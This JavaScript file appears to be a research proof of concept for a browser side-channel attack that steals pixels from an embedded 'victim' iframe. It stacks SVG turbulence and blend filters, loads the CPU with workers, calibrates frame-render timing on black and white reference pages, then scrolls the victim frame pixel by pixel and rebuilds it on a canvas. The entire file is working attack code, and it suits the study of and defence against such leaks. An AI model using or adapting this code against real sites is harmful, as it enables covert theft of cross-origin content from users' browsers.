// starting warmup before the whole attack
let warmupTime;

let pixel;
let inner_frame;
let scroll;
let frame;

// for alternating black and white
let all_time; // 2d array
let rept;
let time_collect;
let freq_worker;

// div size and layer number
let div_size;
let layer_num;

// stress configs
let stress_type;
let num_workers;
let bigint_digits;

// true if we just want to see b/w difference without pixel stealing
let test_mode;

// threshold
let low;
let high;

let bwStatistics; // object to store values useful for threshold

// the current scrollLeft and scrollTop, always reflect the current offset of victim frame
let x, y = 0;

function updateStatus(newText) {
    document.getElementById("status").innerHTML = newText;
}

let onFrameStart = () => { };

function foreverRender() {
    pixel.classList.remove("timing2");
    pixel.classList.add("timing1");
    requestAnimationFrame(function () {
        onFrameStart();
        pixel.classList.remove("timing1");
        pixel.classList.add("timing2");
        requestAnimationFrame(function () {
            onFrameStart();
            foreverRender()
        });
    });
}

async function collectTimeArray(array) {
    const startTime = Date.now();
    let prevTime = startTime;
    let currTime;
    let resolved = false;

    await (() => new Promise((resolve, _reject) => {
        onFrameStart = () => {
            currTime = Date.now();
            if (currTime - startTime < time_collect) {
                array.push(currTime - prevTime);
                prevTime = currTime;
            } else {
                !resolved && (resolved = true) && resolve();
            }
        };
    }))();

    onFrameStart = () => { };
}

// prefill some parameters
const adjustDivSize = () => {
    let windowHeight = window.outerHeight * window.devicePixelRatio;
    let windowWidth = window.outerWidth * window.devicePixelRatio;
    document.getElementById("div_size").value = (windowHeight > windowWidth ? windowHeight : windowWidth);
}
document.addEventListener('DOMContentLoaded', adjustDivSize, false);

// Set filter
function filter_content() {
    let filter = " <filter> \n ";
    filter += `<feTurbulence type="turbulence" baseFrequency="0.9 0.9" numOctaves="1" seed="1" stitchTiles="stitch" x="0" y="0" width="${div_size}px" height="${div_size}px" result="turbulence"/> \n`;

    filter += `<feBlend in="SourceGraphic" in2="turbulence" mode="multiply" result="x1"/> \n`;
    for (let i = 1; i < layer_num; i++) {
        filter += `<feBlend in="SourceGraphic" in2="x${i}" mode="multiply" result="x${i + 1}"/> \n`;
    }
    return filter;
}


/**************** reconstruct *****************/

async function reconstruct() {

    pixel = document.getElementById("pixel");
    low = parseFloat(document.getElementById("low").value);
    high = parseFloat(document.getElementById("high").value);
    stress_type = parseInt(document.getElementById("stress_type").value, 10);
    div_size = parseInt(document.getElementById("div_size").value, 10);
    layer_num = parseInt(document.getElementById("layer").value, 10);
    warmupTime = 1000 * parseInt(document.getElementById("warmup_time").value, 10);
    num_workers = parseInt(document.getElementById("num_workers").value, 16);
    bigint_digits = parseInt(document.getElementById("bigint_digits").value, 32);
    test_mode = document.getElementById("test-mode").checked;

    // change size
    frame = document.getElementById("frame");
    frame.style.width = div_size + 'px';
    frame.style.height = div_size + 'px';
    changeSecondaryFrameSize(div_size);

    // set the filter
    let filterContent = filter_content();
    console.log(filterContent);
    document.getElementById('filter-input').value = filterContent;
    const svgElem1 = document.getElementById("input-filter1");
    svgElem1.innerHTML = document.getElementById("filter-input").value;
    svgElem1.children[0].id = 'filter1';
    const svgElem2 = document.getElementById("input-filter2");
    svgElem2.innerHTML = document.getElementById("filter-input").value;
    svgElem2.children[0].id = 'filter2';

    // scroll to the pixel frame
    pixel.scrollIntoView();

    // start the attack
    attack();
}

async function attack() {

    let start = performance.now();
    await changeFrameSrc("chrome-embed-zoom-white.html");
    changeSecondaryFrameSize(div_size);

    await warmup(start, warmupTime); // warmup cpu&gpu for (warmupTime) seconds

    // Find Threshold: alternate black and white for time_collect for some number of repetition
    all_time = {};

    time_collect = parseInt(document.getElementById("time").value, 10);
    rept = parseInt(document.getElementById("repetition").value, 10);

    let curr_bw = 0;
    let curr_rep = 0;

    foreverRender();

    console.log("finding threshold");
    for (let i = 0; i < rept; i++) {
        curr_rep = i;
        if (curr_bw == 0) { // black
            // change the frame source to our referencce black
            await changeFrameSrc("chrome-embed-zoom-black.html");
            changeSecondaryFrameSize(div_size);
        } else { // white
            // change the frame source to our reference white
            await changeFrameSrc("chrome-embed-zoom-white.html");
            changeSecondaryFrameSize(div_size);
        }

        all_time[curr_rep] = [];

        await collectTimeArray(all_time[curr_rep]);

        curr_bw = 1 - curr_bw;
    }
    // black: {} iteration i-> timer array
    // white: {} iteration i-> timer array
    calculateBWStatistics();
    updateStatus(`Black Mean: ${bwStatistics.blackMean} White Mean: ${bwStatistics.whiteMean}`);

    if (!test_mode) {
        // Start the real attack
        // 1. Load the victim frame
        await changeFrameSrc("chrome-embed-zoom-scroll.html");
        changeSecondaryFrameSize(div_size);

        // 2. Loop through 48*48 (the pixels we want to steal from our poc victim) and compare the timer with cutt off and fill the reconstruction canvas
        let currentTimeArray = [];
        let error = 0;
        let start_attack = performance.now();
        for (let i = 0; i < 80; i += 1) {
            for (let j = 0; j < 80; j += 1) {
                let ret = -1;
                while (ret == -1) {
                    console.log(`Reconstructing (${i}, ${j})`);
                    scrollFrame(i, j);
                    await collectTimeArray(currentTimeArray);
                    let reading = currentTimeArray;
                    ret = isLikelyWhite(reading);
                    if (ret == 1) {
                        console.log("Reconstruct to white");
                        paintPixel("#ffffff");
                    } else if (ret == 0) {
                        console.log("Reconstruct to black");
                        paintPixel("#000000");
                    }
                    currentTimeArray = [];
                }
                error = error + checkerror(i, j, ret);

            }
        }

        let end_attack = performance.now();
        console.log("total time", end_attack - start_attack);
        console.log("total error", error);

    }
    haltStressCPU();
}


async function warmup(start, total_time) { // warm up cpu and gpu 
    return new Promise(function (resolve, reject) {

        const mainLoop = () => {
            let curr = performance.now();
            if (curr >= (start + total_time)) {
                resolve();
                return;
            }
            pixel.classList.remove("timing2");
            pixel.classList.add("timing1");
            requestAnimationFrame(function () {
                pixel.classList.remove("timing1");
                pixel.classList.add("timing2");
                requestAnimationFrame(function () {
                    mainLoop();
                });
            });
        };

        stressCPU();
        mainLoop();
    });
}

// paint the next pixel on the reconstruction canvas
// color: hex value e.g. #000000 black or #ffffff white
// the x,y offsets are shared with the victim frame
// x=scrollLeft y=scrollTop
function paintPixel(color) {
    let canvas = document.getElementById("canvas");
    ctx = canvas.getContext("2d");
    ctx.fillStyle = color;
    ctx.fillRect(x, y, 1, 1);
}

// scroll the victim frame
function scrollFrame(scrollLeft, scrollTop) {
    frame = document.getElementById("frame");
    scroll = frame.contentWindow.document.getElementById('scroll');
    x = scroll.scrollLeft = scrollLeft;
    y = scroll.scrollTop = scrollTop;
}

function changeFrameSrc(newSrc) {
    return new Promise(function (resolve, reject) {
        frame = document.getElementById("frame");
        frame.src = newSrc;
        frame.onload = function () { resolve(); }
    });
}

// input: all_time, 2D array of alternate B-W readings 
function calculateBWStatistics() {
    // 1. put all black data together, and all white data together
    // even is black, odd is white
    let bwArr = [[], []];
    for (let i = 20; i < rept; i += 1) {
        let b_or_w = i & 1;
        // trim first 10 percent data
        bwArr[b_or_w] = bwArr[b_or_w].concat(all_time[i].slice(Math.floor((all_time[i].length) / 10)));
    }
    bwArr[0].sort(function (a, b) { return a - b });
    bwArr[1].sort(function (a, b) { return a - b });

    // 2. remove top 5% and bottom 5% by slicing
    bwArr[0] = bwArr[0].slice(Math.floor((bwArr[0].length) / 20), Math.floor(19 * (bwArr[0].length) / 20));
    bwArr[1] = bwArr[1].slice(Math.floor((bwArr[1].length) / 20), Math.floor(19 * (bwArr[1].length) / 20));

    // 3. get mean and median 
    bwStatistics = {
        blackMean: bwArr[0].reduce((a, b) => a + b) / bwArr[0].length,
        blackMedian: bwArr[0][Math.floor(bwArr[0].length / 2)],
        blackLow: bwArr[0][0],
        whiteMean: bwArr[1].reduce((a, b) => a + b) / bwArr[1].length,
        whiteMedian: bwArr[1][Math.floor(bwArr[1].length / 2)],
        whiteLow: bwArr[1][0],
    };
}

// reading: 1D array collected from the timer
// output: 1 if we think it is white, 0 if we think it is black, -1 undecided
function isLikelyWhite(reading) {
    // trim first 10 percent data when the code is not warmed up enough
    let reading_trim = reading.slice(Math.floor((reading.length) / 10));
    // remove top 5% and bottom 5% by slicing
    reading_trim.sort(function (a, b) { return a - b });
    reading_trim = reading_trim.slice(Math.floor(reading_trim.length / 20), Math.floor(19 * (reading_trim.length) / 20));

    const readingMean = reading_trim.reduce((a, b) => a + b) / reading_trim.length;
    const readingMedian = reading_trim[Math.floor(reading_trim.length / 2)];

    let ret = -1;

    let white_median_threshold = bwStatistics.whiteMedian + (bwStatistics.blackMedian - bwStatistics.whiteMedian) * high;
    let white_mean_threshold = bwStatistics.whiteMean + (bwStatistics.blackMean - bwStatistics.whiteMean) * high;
    if ((readingMedian > white_median_threshold) && (readingMean > white_mean_threshold)) {
        ret = 1;
    }

    let black_median_threshold = bwStatistics.whiteMedian + (bwStatistics.blackMedian - bwStatistics.whiteMedian) * low;
    let black_mean_threshold = bwStatistics.whiteMean + (bwStatistics.blackMean - bwStatistics.whiteMean) * low;
    if ((readingMedian < black_median_threshold) && (readingMean < black_mean_threshold)) {
        ret = 0;
    }
    return ret;
}

/**************** Code for stressing CPU */
let workers = [];

const stressCPU = () => {
    for (let i = 0; i < num_workers; i += 1) {
        if (stress_type == 1) {
            let worker;
            worker = new Worker("worker_big.js");
            workers.push(worker);
            worker.onmessage = e => {
                console.log("a worker lost its mind");
            };
            worker.postMessage({ digits: bigint_digits });
        }
    }
}

const haltStressCPU = () => {
    const workersLength = workers.length;
    for (let i = 0; i < workersLength; i += 1) {
        workers.pop().terminate();
    }
    console.log(`${workersLength} workers terminated`);
}
/**************** END CPU stressing code */


/************ check for error ********* */

// black 0, white 1
function checkerror(x, y, color) {
    let color_x_y = 1 - ((Math.floor(x / 12) + Math.floor(y / 12)) % 2);
    if (color_x_y == color) {
        return 0;
    }
    return 1;
}

/************ inter-frame set up ********* */
function changeSecondaryFrameSize(size) {
    frame = document.getElementById("frame");
    frame.contentWindow.postMessage({
        size
    });
}

